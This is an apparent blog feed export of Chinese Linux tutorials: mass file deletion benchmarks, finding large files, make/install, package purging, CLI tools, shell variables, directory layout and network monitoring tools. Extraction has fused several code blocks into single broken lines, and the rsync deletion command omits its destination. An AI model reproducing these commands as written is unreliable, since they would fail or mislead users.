        <content type="html"><![CDATA[<p>首先建立50万个文件</p><pre><code>for i in $(seq 1 500000);do echo text &gt;&gt;$i.txt;done</code></pre><h1 id="rm删除"><a href="#rm删除" class="headerlink" title="rm删除"></a>rm删除</h1><pre><code>time rm -f *zshsure you want to delete all the files in /home/hungerr/test [yn]? yzsh: argument list too long</code></pre><p>total由于文件数量过多，rm不起作用。</p><h1 id="find删除"><a href="#find删除" class="headerlink" title="find删除"></a>find删除</h1><pre><code>time find ./ -type f -exec rm {} \;</code></pre><p>49.86s user 1032.13s system 41% cpu 43:19.17 total大概43分钟,我的电脑。。。。。。边看视频边删的。</p><h1 id="find-with-delete"><a href="#find-with-delete" class="headerlink" title="find with delete"></a>find with delete</h1><pre><code>time find ./ -type f -delete</code></pre><p>0.43s user 11.21s system 2% cpu 9:13.38 total用时9分钟。</p><h1 id="rsync删除"><a href="#rsync删除" class="headerlink" title="rsync删除"></a>rsync删除</h1><p>首先建立空文件夹blanktest</p><pre><code>time rsync -a --delete blanktest/</code></pre><p>0.59s user 7.86s system 51% cpu 16.418 total16s，很好很强大。</p><h1 id="Python删除"><a href="#Python删除" class="headerlink" title="Python删除"></a>Python删除</h1><pre><code>import osimport timeitdef main():    for pathname,dirnames,filenames in os.walk(&#39;/home/username/test&#39;):        for filename in filenames:            file=os.path.join(pathname,filename)            os.remove(file)if __name__==&#39;__main__&#39;:    t=timeit.Timer(&#39;main()&#39;,&#39;from __main__ import main&#39;)    print t.timeit(1)python test.py529.309022903大概用时9分钟。</code></pre><h1 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h1><p>rm：文件数量太多，不可用<br>find with -exec 50万文件耗时43分钟<br>find with -delete 9分钟<br>Python 9分钟<br>rsync with -delete  16s<br>结论：删除大量小文件rsync最快，最方便。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 系统查找大文件</title>
      <link href="/2024/07/24/ten/"/>
      <url>/2024/07/24/ten/</url>
      
        <content type="html"><![CDATA[<p>在Windows系统中，我们可以使用TreeSize工具查找一些大文件或文件夹，非常的方便高效，在Linux系统中，<br>如何去搜索一些比较大的文件呢？下面我整理了一下在Linux系统中如何查找大文件或文件夹的方法。</p><h1 id="如何查找大文件？"><a href="#如何查找大文件？" class="headerlink" title="如何查找大文件？"></a>如何查找大文件？</h1><p>其实很多时候，你需要了解当前系统下有哪些大文件，比如文件大小超过100M或1G（阀值视具体情况而定）。<br>那么如何把这些大文件搜索出来呢？例如我要搜索当前目录下，超过800M大小的文件<br>如上命令所示，我们仅仅能看到超过800M大小的文件的文件名称，但是对文件的信息（例如，文件大小、文件属性）一无所知，<br>那么能否更详细显示一些文件属性或信息呢如果你还需要对查找结果按照文件大小做一个排序，那么可以使用下面命令</p><pre><code>find . -type f -size +800M  -print0 | xargs -0 du -h | sort -nr</code></pre><h1 id="如何查找Linux下的大目录"><a href="#如何查找Linux下的大目录" class="headerlink" title="如何查找Linux下的大目录"></a>如何查找Linux下的大目录</h1><p>譬如有时候磁盘空间告警了，而你平时又疏于管理、监控文件的增长，那么我需要快速的了解哪些目录变得比较大，<br>那么此时我们可以借助du命令来帮我们解决这个问题。</p><pre><code>du -h --max-depth=1 16K    ./lost+found 33G    ./flash_recovery_area 37G    ./oradata 70G     .</code></pre><p>如果你想知道flash_recovery_area目录下面有哪些大文件夹，那么可以将参数max-depth=2 ，如果你想对搜索出来的结果进行排序，<br>那么可以借助于sort命令。如下所示</p><pre><code>du -h --max-depth=2 | sort -n</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 终端诡异家伙</title>
      <link href="/2024/07/24/nine/"/>
      <url>/2024/07/24/nine/</url>
      
        <content type="html"><![CDATA[<p>这篇文章，我们一起来到 Linux 的诡异的一面……你知道吗？在我们日常使用的 Unix（和 Linux ）及其各种各样的分支系统中，<br>存在着一些诡异的命令或进程，它们让人毛骨悚然，有些确实是有害，但也有些却是有益的。下面就来简单介绍一下这些家伙吧。</p><h1 id="daemon"><a href="#daemon" class="headerlink" title="daemon"></a>daemon</h1><p>daemon 有一个很高大上的中文名字，叫守护进程 。有句话是这么说的，如果 Unix 中没有了守护进程，那么 Unix 就不会是相同的。<br>它很有个性，是一个运行在后台且不受终端控制的进程，其大多数都是随着系统启动而启动，无特殊情况下会一直保持运行直到系统关闭。<br>它的存在为我们用户和系统本身提供有用的服务。常见的有 httpd，mysqld，syslogd 等，一般守护程序名称会以  d 结尾。</p><h1 id="zombie"><a href="#zombie" class="headerlink" title="zombie"></a>zombie</h1><p>zombie ，僵尸？什么鬼？听着就让人害怕。不过，它在 Linux 中指的是当一个进程被杀死后，其实它并不会马上消失，<br>而是变成了 zombie ，即僵尸进程，然后等待其父进程搜集完它的信息才会被清除。一般这种搜集信息的过程会很快完成，<br>但有时它的父进程很忙，该僵尸进程就会一直呆在我们的系统中。系统运行过程中时不时地会产生一些僵尸进程，我们无法直接杀死它们，<br>因为它们已经死了，我们只能采取别的手段，比如说杀死它的父进程，然后由 init 来回收这个僵尸进程。<br>僵尸进程的出现通常表示产生它的进程除了问题，而且它会消耗资源，要防止它的出现。</p><h1 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h1><p>kill ，一个冷酷无情的单词。顾名思义，kill 是一个用于杀死进程的命令，其使用方法简单粗暴。<br>当你发现一个占用太多内存或者 CPU 资源的进程并造成了负面影响时，建议您可以直接用 kill 干掉它。<br>若你遇到僵尸进程杀不掉？别慌，去找它的父进程吧，按上面提到的方法来处理。</p><h1 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h1><p>cat，猫？这又是什么奇怪的东西？Linux中除了僵尸还有猫？其实，cat 命令是 concatenate 的简写，也就是连接的意思，<br>这么解释你就懂了。它的作用是组合文件。另外，你甚至可以用这个方便的命令来查看文件的内容。</p><h1 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h1><p>tail，尾巴。这个怪怪的命令解释起来就比较容易了。当你想要查看文件的最后 n 行时，使用 tail 命令就很方便了。<br>另外，当你想要监控文件时，你也可以用它。比如观察日志文件，tail 命令会显示尾部的内容并且可以实时更新，是不是很厉害呢？</p><h1 id="which"><a href="#which" class="headerlink" title="which"></a>which</h1><p>which，别看了前面几个诡异的命令就和 witch（女巫）搞混了。它不是那种童话中阴森恶毒的女巫，它是 which，<br>是负责打印传递给它的任何命令相关联的文件的位置的家伙。例如，我们想要获取 Python 的位置，我们就可以用 which python ，<br>它就会在你的系统上打印每个版本的 Python 的位置。</p><h1 id="crypt"><a href="#crypt" class="headerlink" title="crypt"></a>crypt</h1><p>crypt，地下室，这个命令也很好懂。当你想要保管好自己的东西不被别人知道，放到地下室锁起来是一个很好的办法。<br>crypt 在 Linux 中的含义是加密，现在被称为 mcrypt ，当你想要对文件进行加密而不被别人读取，这个命令会很方便。<br>与大多数 Linux 命令一样，您可以单独使用 crypt ，也可以在系统脚本中使用。</p><h1 id="shred"><a href="#shred" class="headerlink" title="shred"></a>shred</h1><p>shred，切碎。我想你看到这里已经对这些怪异的词语见怪不怪了。它是个非常狠的家伙，作用是粉碎文件。当我们想要删除文件，<br>我们会用 rm 命令，但这是有手段进行恢复的，那我们不想让别人恢复怎么办？没错，sherd 的作用就此。<br>shred 能多次覆盖文件以前占用的空间。所以说，用这个命令一点要做好心理准备，因为神仙难救。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Make 三连</title>
      <link href="/2024/07/24/eight/"/>
      <url>/2024/07/24/eight/</url>
      
        <content type="html"><![CDATA[<p>Unix 开发过程中，经常性的操作是从源码编译安装相应库文件，所以下面三个命令便是家常便饭，俗称三连：</p><pre><code>./configuremakemake install</code></pre><p>下面来看看这三步分别做了什么。</p><h1 id="configure"><a href="#configure" class="headerlink" title="configure"></a>configure</h1><p>执行 ./configure 文件一般是进行正式编译前的一些环境准备，准备编译需要的依赖项等。比如检测当前的系统平台，<br>检测需要的编译器是否存在如何调用，配置和生成相应编译所需文件。</p><h1 id="make"><a href="#make" class="headerlink" title="make"></a>make</h1><p>前期准备工作完成无误后，就可能调用 make 来执行编译了。实际执行的是 Makefile 文件中定义的任务来从源码进行项目的编译。<br>通常情况下下载下来的 tar 包中可能没有包含正式的 Makefile 文件，而是另外形式呈现的临时文件，<br>比如 Makefile.in，Makefile.am,Makefile.MSVC 等，然后在执行 ./configure 的时候根据相应环境来生成最终需要的 Makefile 文件。</p><h1 id="make-install"><a href="#make-install" class="headerlink" title="make install"></a>make install</h1><p>项目编译正常后，会生成相应的产出，可执行文件，so 或 o 文件或 DLL 动态链接文件等。最后一步就是将生成的文件复制到相应的系统目录，<br>这个过程便是安装。比如将可执行文件复制到系统 PATH 能取到的地方，帮助文档复制到 MANPATH，其他文件复制到对应目录下。<br>这种默认安装路径的话，会把可执行文件拷贝到/usr/local/bin，如果没有sudo权限的话是会失败的，有两种方法指定安装路径。 一种是在./configure的时候指定路径</p><pre><code>./configure --prefix=安装路径make install DESTDIR=安装路径</code></pre><h1 id="pip-install"><a href="#pip-install" class="headerlink" title="pip install"></a>pip install</h1><p>在Linux下直接用pip install packageName，有些文件会被放到根目录下，如果没有sudo权限的话，是会安装失败的。这个以后我们就需要指定安装的目录了。<br>pip install –install-option=”–prefix=绝对路径” packageName</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu 完全卸载一个软件包</title>
      <link href="/2024/07/23/six/"/>
      <url>/2024/07/23/six/</url>
      
        <content type="html"><![CDATA[<p>今天卸载一个软件，老是有配置残留，网上找到了解决方案：<br>查看已安装的软件：</p><pre><code>dpkg -l |grep 软件名</code></pre><p>找到一大堆相关的包，然后卸载核心的包：</p><pre><code>sudo apt-get remove --purge 软件包名</code></pre><p>继续grep，直到找不到相关的包。<br>最后再来两把：</p><pre><code>sudo apt-get autoremovesudo apt-get clean</code></pre><p>注销一下当前用户再登录 一般就干净了。<br>安装deb：</p><pre><code>sudo dpkg -i xxxxx.deb</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 命令行神器推荐</title>
      <link href="/2024/07/23/five/"/>
      <url>/2024/07/23/five/</url>
      
        <content type="html"><![CDATA[<p>• ag：比grep、ack更快的递归搜索文件内容。<br>• jq: json文件处理以及格式化显示，支持高亮，可以替换python -m json.tool。<br>• ncdu：可视化的空间分析程序<br>你发现有人把 /home 空间撑爆了，影响了大家的工作，你愤怒了一层层的 du，一层层的 cd，整个过程就像刨垃圾堆一样的恶心，后来发现了 ncdu 这个基于 ncurses 的空间分析程序：不但能用光标上下键移动，回车还可以进入对应目录又可以查看最新的占用，很快就揪出了占用空间最大的罪魁祸首。<br>• shellcheck：shell脚本静态检查工具，能够识别语法错误以及不规范的写法。<br>• fzf：命令行下模糊搜索工具，能够交互式智能搜索并选取文件或者内容，配合终端ctrl-r历史命令搜索简直完美。<br>• PathPicker(fpp): 在命令行输出中自动识别目录和文件，支持交互式，配合git非常有用。运行以下命令：</p><pre><code>git diff HEAD~8 --stat | fpp</code></pre><p>• htop: 提供更美观、更方便的进程监控工具，替代top命令。<br>• glances：更强大的 htop / top 代替者。htop 代替 top，glances 代替 htop：<br>信息比 htop 丰富了不少，更全了，对吧？除了命令行查看外，glances 还提供页面服务，让你从页面上随时查看某服务器的状态。<br>• axel：多线程下载工具，下载文件时可以替代curl、wget。</p><pre><code>axel -n 20 http://centos.ustc.edu.cn/centos/7/isos/x86_64/CentOS-7-x86_64-Minimal-1511.iso</code></pre><p>• sz/rz：交互式文件传输，在多重跳板机下传输文件非常好用，不用一级一级传输。<br>• cloc：代码统计工具，能够统计代码的空行数、注释行、编程语言。<br>• tmux：终端复用工具，替代screen、nohup。<br>• script/scriptreplay:  终端会话录制。<br>// 录制</p><pre><code>script -t 2&gt;time.txt session.typescript// your commands// 录制结束// 回放scriptreplay -t time.txt session.typescriptexit</code></pre><p>• multitail：多重 tail。通常你不止一个日志文件要监控，怎么办？终端软件里开多个 tab 太占地方，可以试试这个工具：</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux shell变量含义</title>
      <link href="/2024/07/23/four/"/>
      <url>/2024/07/23/four/</url>
      
        <content type="html"><![CDATA[<p>$$               Shell本身的PID（ProcessID）<br>$!               Shell最后运行的后台Process的PID<br>$?               最后运行的命令的结束代码（返回值）<br>$-               使用Set命令设定的Flag一览<br>$<em>               所有参数列表。如”$</em>“用「”」括起来的情况、以”$1 $2 … $n”的形式输出所有参数。<br>$@               所有参数列表。如”$@”用「”」括起来的情况、以”$1” “$2” … “$n” 的形式输出所有参数。<br>$#               添加到Shell的参数个数<br>$0               Shell本身的文件名<br>$1～$n           添加到Shell的各参数值。$1是第1参数、$2是第2参数…。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux系统目录结构</title>
      <link href="/2024/07/20/three/"/>
      <url>/2024/07/20/three/</url>
      
        <content type="html"><![CDATA[<p>/bin  经常使用的指令<br>/boot 启动linux的核心文件<br>/dev  外部设备<br>/etc  系统管理配置文件和子目录<br>/home  自己的目录<br>/lib  共享动态链接库<br>/lost+found  非法关机后存放文件<br>/media   识别的设备的文件<br>/mnt  临时挂载别的文件系统<br>/opt  主机额外安装软件的目录<br>/proc   虚拟的目录，在内存上而不在硬盘上<br>/root  系统管理员<br>/sbin  系统管理员的系统管理程序<br>/srv  存放服务启动之后需要提取的数据<br>/tmp  存放临时文件<br>/usr  用户的很多应用程序和文件<br>/usr/bin  系统用户使用的应用程序<br>/usr/sbin  超级用户使用的管理程序和系统守护程序<br>/usr/src  内核源代码的目录<br>/var  修改的目录的日志文                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        身的文件数据<br>/var/log     日志文件                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       </p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 网络工具</title>
      <link href="/2024/06/29/second/"/>
      <url>/2024/06/29/second/</url>
      
        <content type="html"><![CDATA[<p>如果要在你的系统上监控网络，那么使用命令行工具是非常实用的，并且对于 Linux 用户来说，有着许许多多现成的工具可以使用，<br>如： nethogs, ntopng, nload, iftop, iptraf, bmon, slurm,<br>tcptrack, cbm, netwatch, collectl, trafshow, cacti, etherape, ipband, jnettop, netspeed 以及 speedometer。<br>鉴于世上有着许多的 Linux 专家和开发者，显然还存在其他的网络监控工具，但在教程中，<br>我不打算将它们所有包括在内。<br>上面列出的工具都有着自己的独特之处，但归根结底，它们都做着监控网络流量的工作，<br>只是通过各种不同的方法。例如 nethogs 可以被用来展示每个进程的带宽使用情况，<br>以防你想知道究竟是哪个应用在消耗了你的整个网络资源；</p><pre><code>iftop 可以被用来展示每个套接字连接的带宽使用情况，nload 这类的工具可以帮助你得到有关整个带宽的信息。</code></pre><h1 id="nethogs"><a href="#nethogs" class="headerlink" title="nethogs"></a>nethogs</h1><p>nethogs 是一个免费的工具，当要查找哪个 PID (注：即 process identifier，进程 ID) 给你的网络流量带来了麻烦时，它是非常方便的。<br>它按每个进程来分组带宽，而不是像大多数的工具那样按照每个协议或每个子网来划分流量。它功能丰富，同时支持 IPv4 和 IPv6，<br>并且我认为，若你想在你的 Linux 主机上确定哪个程序正消耗着你的全部带宽，它是来做这件事的最佳的程序。<br>一个 Linux 用户可以使用 nethogs 来显示每个进程的 TCP 下载和上传速率，可以使用命令 nethogs eth0 来监控一个指定的设备，<br>上面的 eth0 是那个你想获取信息的设备的名称，你还可以得到有关正在传输的数据的传输速率信息。对我而言， nethogs 是非常容易使用的，<br>或许是因为我非常喜欢它，以至于我总是在我的 Ubuntu 12.04 LTS 机器中使用它来监控我的网络带宽。例如要想使用混杂模式来嗅探，<br>可以像下面展示的命令那样使用选项 -p：</p><pre><code>nethogs -p wlan0</code></pre><p>假如你想更多地了解 nethogs 并深入探索它，那么请毫不犹豫地阅读我们做的关于这个网络带宽监控工具的整个教程。</p><h1 id="nload"><a href="#nload" class="headerlink" title="nload"></a>nload</h1><p>nload 是一个控制台应用，可以被用来实时地监控网络流量和带宽使用情况，它还通过提供两个简单易懂的图表来对流量进行可视化。<br>这个绝妙的网络监控工具还可以在监控过程中切换被监控的设备，而这可以通过按左右箭头来完成。<br>正如你在上面的截图中所看到的那样，由 nload 提供的图表是非常容易理解的。nload 提供了有用的信息，<br>也展示了诸如被传输数据的总量和最小/最大网络速率等信息。而更酷的是你只需要直接运行 nload 这个工具就行，这个命令是非常的短小且易记的：</p><h1 id="slurm"><a href="#slurm" class="headerlink" title="slurm"></a>slurm</h1><p>slurm 是另一个 Linux 网络负载监控工具，它以一个不错的 ASCII 图来显示结果，它还支持许多按键用以交互，例如 c 用来切换到经典模式，<br>s 切换到分图模式， r 用来重绘屏幕， L 用来启用 TX/RX 灯（注：TX，发送流量；RX，接收流量） ，<br>m 用来在经典分图模式和大图模式之间进行切换， q 退出 slurm。在网络负载监控工具 slurm 中，还有许多其它的按键可用，<br>你可以很容易地使用下面的命令在 man 手册中学习它们。</p><pre><code>man slurm</code></pre><p>slurm 在 Ubuntu 和 Debian 的官方软件仓库中可以找到，所以使用这些发行版本的用户可以像下面展示的那样，<br>使用 apt-get 安装命令来轻松地下载它：</p><pre><code>sudo apt-get install slurm</code></pre><p>我们已经在一个教程中对 slurm 的使用做了介绍，不要忘记和其它使用 Linux 的朋友分享这些知识。</p><h1 id="iftop"><a href="#iftop" class="headerlink" title="iftop"></a>iftop</h1><p>当你想显示连接到网卡上的各个主机的带宽使用情况时，iftop 是一个非常有用的工具。根据 man 手册，<br>iftop 在一个指定的接口或在它可以找到的第一个接口（假如没有任何特殊情况，它应该是一个对外的接口）上监听网络流量，<br>并且展示出一个表格来显示当前的一对主机间的带宽使用情况。<br>通过在虚拟终端中使用下面的命令，Ubuntu 和 Debian 用户可以在他们的机器中轻易地安装 iftop：</p><pre><code>sudo apt-get install iftop</code></pre><h1 id="collectl"><a href="#collectl" class="headerlink" title="collectl"></a>collectl</h1><p>collectl 可以被用来收集描述当前系统状态的数据，并且它支持如下两种模式：<br>记录模式<br>回放模式<br>记录模式 允许从一个正在运行的系统中读取数据，然后将这些数据要么显示在终端中，要么写入一个或多个文件或一个套接字中。<br>回放模式<br>根据 man 手册，在这种模式下，数据从一个或多个由记录模式生成的数据文件中读取。<br>Ubuntu 和 Debian 用户可以在他们的机器上使用他们默认的包管理器来安装 colletcl。下面的命令将为他们做这个工作：</p><pre><code>sudo apt-get install collectl</code></pre><h1 id="Netstat"><a href="#Netstat" class="headerlink" title="Netstat"></a>Netstat</h1><p>Netstat 是一个用来监控传入和传出的网络数据包统计数据的接口统计数据命令行工具。<br>它会显示 TCP 连接 (包括上传和下行)，路由表，及一系列的网络接口（网卡或者SDN接口）和网络协议统计数据。<br>Ubuntu 和 Debian 用户可以在他们的机器上使用默认的包管理器来安装 netstat。<br>Netstat 软件被包括在 net-tools 软件包中，并可以在 shell 或虚拟终端中运行下面的命令来安装它：</p><pre><code>sudo apt-get install net-toolsnetstat</code></pre><p>更多的关于 netstat 的信息，我们可以简单地在 shell 或终端中键入 man netstat 来了解：<br>man netstat</p><h1 id="Netload"><a href="#Netload" class="headerlink" title="Netload"></a>Netload</h1><p>netload 命令只展示一个关于当前网络荷载和自从程序运行之后传输数据总的字节数目的简要报告，它没有更多的功能。<br>它是 netdiag 软件的一部分。<br>Netload 是默认仓库中 netdiag 的一部分，我们可以轻易地使用下面的命令来利用 apt 包管理器安装 netdiag：</p><pre><code>sudo apt-get install netdiag</code></pre><p>为了运行 netload，我们需要确保选择了一个正在工作的网络接口的名称，<br>如 eth0, eh1, wlan0, mon0等，然后在 shell 或虚拟终端中运行下面的命令：</p><pre><code>netload wlan2</code></pre><p>注意： 请将上面的 wlan2 替换为你想使用的网络接口名称，假如你想通过扫描了解你的网络接口名称，<br>可以在一个虚拟终端或 shell 中运行 <code>ip link show</code>命令。</p><h1 id="Nagios"><a href="#Nagios" class="headerlink" title="Nagios"></a>Nagios</h1><p>Nagios 是一个领先且功能强大的开源监控系统，它使得网络或系统管理员可以在服务器的各种问题影响到服务器的主要事务之前，<br>发现并解决这些问题。 有了 Nagios 系统，管理员便可以在一个单一的窗口中监控远程的 Linux 、Windows 系统、交换机、路由器和打印机等。<br>它会显示出重要的警告并指出在你的网络或服务器中是否出现某些故障，这可以间接地帮助你在问题发生前就着手执行补救行动。<br>Nagios 有一个 web 界面，其中有一个图形化的活动监视器。通过浏览网页 <a href="http://localhost/nagios/">http://localhost/nagios/</a> 或 <a href="http://localhost/nagios3/">http://localhost/nagios3/</a> 便可以登录到这个 web 界面。<br>假如你在远程的机器上进行操作，请使用你的 IP 地址来替换 localhost，然后键入用户名和密码，我们便会看到如下图所展示的信息：</p><h1 id="EtherApe"><a href="#EtherApe" class="headerlink" title="EtherApe"></a>EtherApe</h1><p>EtherApe 是一个针对 Unix 的图形化网络监控工具，它仿照了 etherman 软件。它支持链路层、IP 和 TCP 等模式，<br>并支持以太网, FDDI, 令牌环, ISDN, PPP, SLIP 及 WLAN 设备等接口，以及一些封装格式。<br>主机和连接随着流量和协议而改变其尺寸和颜色。它可以过滤要展示的流量，并可从一个文件或运行的网络中读取数据包。<br>我们也可以使用下面的命令在 Ubuntu、Debian 及它们的衍生发行版本中使用 apt 包管理器来安装 EtherApe ：</p><pre><code>sudo apt-get install etherape</code></pre><p>在 EtherApe 安装到你的系统之后，我们需要像下面那样以 root 权限来运行 etherape：</p><pre><code>sudo etherape</code></pre><p>然后， etherape 的 图形用户界面 便会被执行。接着，在菜单上面的 捕捉 选项下，我们可以选择 模式(IP，链路层，TCP) 和 接口。<br>一切设定完毕后，我们需要点击 开始 按钮。接着我们便会看到类似下面截图的东西：</p><h1 id="tcpflow"><a href="#tcpflow" class="headerlink" title="tcpflow"></a>tcpflow</h1><p>tcpflow 是一个命令行工具，它可以捕捉 TCP 连接(流)的部分传输数据，并以一种方便协议分析或除错的方式来存储数据。<br>它重构了实际的数据流并将每个流存储在不同的文件中，以备日后的分析。它能识别 TCP 序列号并可以正确地重构数据流，不管是在重发还是乱序发送状态下。<br>通过 apt 包管理器在 Ubuntu 、Debian 系统中安装 tcpflow 是很容易的，因为默认情况下在官方软件仓库中可以找到它。</p><pre><code>sudo apt-get install tcpflow</code></pre><p>我们可以使用 tcpflow 来捕捉全部或部分 tcp 流量，并以一种简单的方式把它们写到一个可读的文件中。下面的命令就可以完成这个事情，但我们需要在一个空目录中运行下面的命令，因为它将创建诸如 x.x.x.x.y-a.a.a.a.z 格式的文件，运行之后，只需按 Ctrl-C 便可停止这个命令。</p><pre><code>sudo tcpflow -i eth0 port 8000</code></pre><p>注意：请将上面的 eth0 替换为你想捕捉的网卡接口名称</p><h1 id="IPTraf"><a href="#IPTraf" class="headerlink" title="IPTraf"></a>IPTraf</h1><p>IPTraf 是一个针对 Linux 平台的基于控制台的网络统计应用。它生成一系列的图形，如 TCP 连接的包/字节计数、接口信息和活动指示器、<br>TCP/UDP 流量故障以及局域网内设备的包/字节计数。<br>在默认的软件仓库中可以找到 IPTraf，所以我们可以使用下面的命令通过 apt 包管理器轻松地安装 IPTraf：</p><pre><code>sudo apt-get install iptraf</code></pre><p>我们需要以管理员权限来运行 IPTraf，并带有一个有效的网络接口名。这里，我们的网络接口名为 wlan2，所以我们使用 wlan2 来作为参数：</p><pre><code>sudo iptraf wlan2</code></pre><p>开始通常的网络接口统计，键入：</p><pre><code>iptraf -g查看接口 eth0 的详细统计信息，使用：iptraf -d eth0查看接口 eth0 的 TCP 和 UDP 监控信息，使用：iptraf -z eth0查看接口 eth0 的包的大小和数目，使用：iptraf -z eth0</code></pre><p>注意:请将上面的 eth0 替换为你的接口名称。你可以通过运行ip link show命令来检查你的接口。</p><h1 id="Speedometer"><a href="#Speedometer" class="headerlink" title="Speedometer"></a>Speedometer</h1><p>Speedometer 是一个小巧且简单的工具，它只用来绘出一幅包含有通过某个给定端口的上行、下行流量的好看的图。<br>我们可以使用下面的命令通过 apt 包管理器轻松地安装 Speedometer：</p><pre><code>sudo apt-get install speedometerSpeedometer 可以简单地通过在 shell 或虚拟终端中执行下面的命令来运行：speedometer -r wlan2 -t wlan2</code></pre><p>注：请将上面的 wlan2 替换为你想要使用的网络接口名称</p><h1 id="Netwatch"><a href="#Netwatch" class="headerlink" title="Netwatch"></a>Netwatch</h1><p>Netwatch 是 netdiag 工具集里的一部分，它也显示当前主机和其他远程主机的连接情况，以及在每个连接中数据传输的速率。<br>Netwatch 是 netdiag 的一部分，可以在默认的软件仓库中找到，所以我们可以轻松地使用下面的命令来利用 apt 包管理器安装netdiag：</p><pre><code>sudo apt-get install netdiag</code></pre><p>为了运行 netwatch， 我们需要在虚拟终端或 shell 中执行下面的命令：</p><pre><code>sudo netwatch -e wlan2 -nt</code></pre><p>注意： 请将上面的 wlan2 替换为你想使用的网络接口名称，假如你想通过扫描了解你的网络接口名称，<br>可以在一个虚拟终端或 shell 中运行 ip link show 命令。</p><h1 id="Trafshow"><a href="#Trafshow" class="headerlink" title="Trafshow"></a>Trafshow</h1><p>Trafshow 同 netwatch 和 pktstat 一样，可以报告当前活动的连接里使用的协议和每个连接中数据传输的速率。<br>它可以使用 pcap 类型的过滤器来筛选出特定的连接。<br>Trafshow 在默认仓库中可以找到，所以我们可以轻松地使用下面的命令来利用 apt 包管理器安装它：</p><pre><code>sudo apt-get install trafshow</code></pre><p>为了使用 trafshow 来执行监控任务，我们需要在虚拟终端或 shell 中执行下面的命令：</p><pre><code>sudo trafshow -i wlan2</code></pre><p>为了专门监控 tcp 连接，如下面一样添加上 tcp 参数：</p><pre><code>sudo trafshow -i wlan2 tcp</code></pre><p>注意： 请将上面的 wlan2 替换为你想使用的网络接口名称，假如你想通过扫描了解你的网络接口名称，可以在一个虚拟终端或 shell 中运行 ip link show 命令。</p><h1 id="Vnstat"><a href="#Vnstat" class="headerlink" title="Vnstat"></a>Vnstat</h1><p>与大多数的其他工具相比，Vnstat 有一点不同。实际上它运行着一个后台服务或守护进程，并时刻记录着传输数据的大小。<br>另外，它可以被用来生成一个网络使用历史记录的报告。<br>Vnstat 在默认软件仓库中可以找到，所以我们可以使用下面的命令运行 apt 包管理器来安装它：</p><pre><code>sudo apt-get install vnstat</code></pre><p>不带有任何选项运行 vnstat 将简单地展示出从该守护进程运行后数据传输的总量。</p><pre><code>vnstatvnstat -l</code></pre><p>为实时地监控带宽使用情况，使用 ‘-l’ 选项(live 模式)。然后它将以一种非常精确的方式来展示上行和下行数据所使用的带宽总量，但不会显示任何有关主机连接或进程的内部细节。<br>完成了上面的步骤后，按 Ctrl-C 来停止，这将会得到如下类型的输出</p><h1 id="tcptrack"><a href="#tcptrack" class="headerlink" title="tcptrack"></a>tcptrack</h1><p>tcptrack 可以展示 TCP 连接的状态，它在一个给定的网络端口上进行监听。tcptrack 监控它们的状态并展示出排序且不断更新的列表，<br>包括来源/目标地址、带宽使用情况等信息，这与 top 命令的输出非常类似 。<br>鉴于 tcptrack 在软件仓库中，我们可以轻松地在 Debian、Ubuntu 系统中从软件仓库使用 apt 包管理器来安装 tcptrack。<br>为此，我们需要在 shell 或虚拟终端中执行下面的命令：</p><pre><code>sudo apt-get install tcptrack</code></pre><p>tcptrack 需要以 root 权限或超级用户身份来运行。执行 tcptrack 时，我们需要带上要监视的网络接口 TCP 连接状况的接口名称。这里我们的接口名称为 wlan2，所以如下面这样使用：</p><pre><code>sudo tcptrack -i wlan2</code></pre><p>假如你想监控特定的端口，则使用：</p><pre><code>tcptrack -i wlan2 port 80</code></pre><p>请替换上面的 80 为你想要监控的端口号。注意： 请将上面的 wlan2 替换为你想使用的网络接口名称，<br>假如你想通过扫描了解你的网络接口名称，可以在一个虚拟终端或 shell 中运行 ip link show 命令。</p><h1 id="CBM"><a href="#CBM" class="headerlink" title="CBM"></a>CBM</h1><p>CBM （ Color Bandwidth Meter） 可以展示出当前所有网络设备的流量使用情况。这个程序是如此的简单，<br>以至于都可以从它的名称中看出其功能。CBM 的源代码和新版本可以在 <a href="http://www.isotton.com/utils/cbm/" target="_blank" rel="noopener">http://www.isotton.com/utils/cbm/</a> 上找到。<br>鉴于 CBM 已经包含在软件仓库中，我们可以简单地使用 apt 包管理器从 Debian、Ubuntu 的软件仓库中安装 CBM。<br>为此，我们需要在一个 shell 窗口或虚拟终端中运行下面的命令：</p><pre><code>sudo apt-get install 